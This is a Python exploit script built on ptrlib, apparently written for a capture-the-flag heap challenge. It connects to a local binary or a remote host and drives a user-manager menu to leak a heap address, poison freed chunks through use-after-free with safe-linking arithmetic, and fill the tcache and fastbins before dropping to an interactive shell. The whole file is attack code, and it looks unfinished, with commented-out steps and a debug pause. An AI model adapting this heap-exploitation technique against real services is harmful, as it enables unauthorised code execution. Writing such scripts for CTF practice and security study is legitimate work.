#!/usr/bin/env python
import ptrlib as ptr
import sys

exe = ptr.ELF("./run_patched")
libc = ptr.ELF("./libc.so.6")
ld = ptr.ELF("./ld-linux-x86-64.so.2")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        addr = "94.237.60.228:46774"
        addr = addr.split(":")
        host = addr[0]
        port = int(addr[1])
        return ptr.Socket(host, port)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def restart_alt():
        io.sendlineafter("> ", "0")
        return

    def restart():
        io.sendlineafter("> ", "1")
        return

    def new(username: bytes | str, password: bytes | str):
        io.sendlineafter("> ", "2")
        if len(username) == 8:
            io.sendafter("username > ", username)
        else:
            io.sendlineafter("username > ", username)
        if len(username) == 8:
            io.sendafter("password > ", password)
        else:
            io.sendlineafter("password > ", password)
        return

    def delete(username: bytes | str):
        io.sendlineafter("> ", "3")
        if len(username) == 8:
            io.sendafter("username > ", username)
        else:
            io.sendlineafter("username > ", username)
        return

    def change(username: bytes | str, password: bytes | str):
        io.sendlineafter("> ", "4")
        if len(username) == 8:
            io.sendafter("username > ", username)
        else:
            io.sendlineafter("username > ", username)
        if len(username) == 8:
            io.sendafter("password > ", password)
        else:
            io.sendlineafter("password > ", password)
        return

    def view() -> bytes:
        io.sendlineafter("> ", "5")
        return io.recvuntil("---- menu ----").strip(b"---- menu ----")

    new("A", "BBBBBBBB")
    heap_base = ptr.u64(view().split(b"A: BBBBBBBB")[1].split(b"\nroot")[0])
    heap_base = heap_base >> 12 << 12
    print(f"heap_base = {hex(heap_base)}")

    delete("A")
    delete("root")
    change(ptr.p64(heap_base >> 12), "hello?")

    for i in range(10):
        restart()

    new("A" * 8, "B" * 8)
    for i in range(6):
        new(ptr.p64(i), "pass")
        continue
    new("fast1", "bins")
    new("fast2", "bins")
    new("fast3", "bins")
    new("fast4", "bins")
    for i in range(7):
        delete(ptr.p64(6 - i))
        continue

    delete("fast1")
    delete("fast2")
    delete("fast3")
    delete("fast4")

    for i in range(7):
        new(ptr.p64(i), "pass")

    io.sh()
    # restart_alt()

    # new("fast4", "bins")
    # print(view())
    input(">>")

    return


if __name__ == "__main__":
    main()
